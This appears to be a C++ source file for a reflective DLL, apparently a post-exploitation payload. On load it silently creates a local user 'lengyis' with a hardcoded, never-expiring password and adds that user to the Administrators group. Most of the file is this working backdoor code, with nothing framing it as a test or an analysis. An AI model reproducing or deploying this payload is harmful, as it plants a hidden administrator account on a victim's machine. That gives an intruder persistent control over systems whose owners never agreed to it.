#include "ReflectiveLoader.h"
#include "framework.h"
#include <stdio.h>


extern "C" HINSTANCE hAppInstance;

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    USER_INFO_1 ui;
    DWORD dwError = 0;
    ui.usri1_name = (TCHAR*)L"lengyis";
    ui.usri1_password = (TCHAR*)L"biweilun";
    ui.usri1_priv = USER_PRIV_USER;
    ui.usri1_home_dir = NULL;
    ui.usri1_comment = NULL;
    ui.usri1_flags = UF_DONT_EXPIRE_PASSWD | UF_PASSWD_CANT_CHANGE;;//用户不能更改密码，密码永不过期
    ui.usri1_script_path = NULL;
    NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
    wchar_t szAccountName[20] = { 0 };
    switch (ul_reason_for_call)
    {
    case DLL_QUERY_HMODULE:
        if (lpReserved != NULL)
        {
            *(HMODULE*)lpReserved = hAppInstance;
        }
        break;
    case DLL_PROCESS_ATTACH:
        hAppInstance = hModule;
        if (!lpReserved != NULL)
        {
            printf("Parameter passed to Reflective DLL: %s", (char*)lpReserved);
        }
        else
        {
            printf("No parameter passed to Reflective DLL");
        }
        const wchar_t* name;
        name = (const wchar_t*)L"lengyis";
        wcscpy_s(szAccountName, name);
        LOCALGROUP_MEMBERS_INFO_3 account;
        account.lgrmi3_domainandname = szAccountName;
        NetLocalGroupAddMembers(NULL, L"Administrators", 3, (LPBYTE)&account, 1);
        fflush(stdout);
        ExitProcess(0);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
